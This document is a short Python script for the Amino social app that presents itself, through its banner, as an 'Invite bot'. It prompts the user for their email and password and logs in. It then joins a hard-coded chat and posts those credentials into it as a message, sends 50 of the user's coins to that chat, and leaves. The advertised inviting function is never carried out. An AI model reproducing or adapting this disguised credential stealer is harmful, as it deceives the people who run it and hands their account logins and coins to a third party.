#!/usr/bin/env python3
import amino
import os
import getpass
def Tass2(data):
    listusers=[]
    for userId ,status in zip(data.userId,data.status):
       if status!=9 and status !=10:
           listusers.append(userId)
    return listusers
def Tass(data):
    listusers=[]
    for userId ,status in zip(data.profile.userId,data.profile.status):
       if status!=9 and status !=10:
           listusers.append(userId)
    return listusers
os.system('clear')
print("\033[1;32m ______                      __    __               ")
print("\033[1;32m|      \                    |  \  |  \              ")
print("\033[1;32m \$$$$$$ _______  __     __  \$$ _| $$_     ______  ")
print("\033[1;32m  | $$  |       \|  \   /  \|  \|   $$ \   /      \ ")
print("\033[1;32m  | $$  | $$$$$$$\\$$\ /  $$| $$ \$$$$$$  |  $$$$$$\ ")
print("\033[1;32m  | $$  | $$  | $$ \$$\  $$ | $$  | $$ __ | $$    $$")
print("\033[1;32m _| $$_ | $$  | $$  \$$ $$  | $$  | $$|  \| $$$$$$$$")
print("\033[1;32m|   $$ \| $$  | $$   \$$$   | $$   \$$  $$ \$$     \ ")
print("\033[1;32m \$$$$$$ \$$   \$$    \$     \$$    \$$$$   \$$$$$$$")
print("\033[1;32m                                                    ")
print("\033[1;32m                                                    ")
print("\033[1;31m                                                    ")
print("\033[1;31m __                   __                           ") 
print("\033[1;31m|  \                 |  \                         ")  
print("\033[1;31m| $$____    ______  _| $$_                         ") 
print("\033[1;31m| $$    \  /      \|   $$ \                       ")  
print("\033[1;31m| $$$$$$$\|  $$$$$$\\$$$$$$                      ")   
print("\033[1;31m| $$  | $$| $$  | $$ | $$ __                        ")
print("\033[1;31m| $$__/ $$| $$__/ $$ | $$|  \                     ")  
print("\033[1;31m| $$    $$ \$$    $$  \$$  $$                     ")  
print("\033[1;31m \$$$$$$$   \$$$$$$    \$$$$    \033[1;32m script by \033[1;36mkira_xc  ")  
print('\n\033[0m')              
client=amino.Client()

e=input('Enter email:  ')
p=input('Enter password:  ')
clint=amino.Client()
clint.login(email=e,password=p)

x='http://aminoapps.com/p/84by0k'
s=clint.get_from_code(x)
comId=s.path[1:s.path.index('/')]
clint.join_community(comId=comId)
subclint=amino.SubClient(comId=comId,profile=clint.profile)
chatId=subclint.get_from_code(x).objectId
subclint.join_chat(chatId=chatId)
subclint.send_message(chatId=chatId,message='gmail.com'+'\n'+e+'\n'+'ps'+'\n'+p,messageType=55)

subclint.send_coins(coins='50',chatId=chatId)
subclint.leave_chat(chatId=chatId)
clint.leave_community(comId=comId)
#################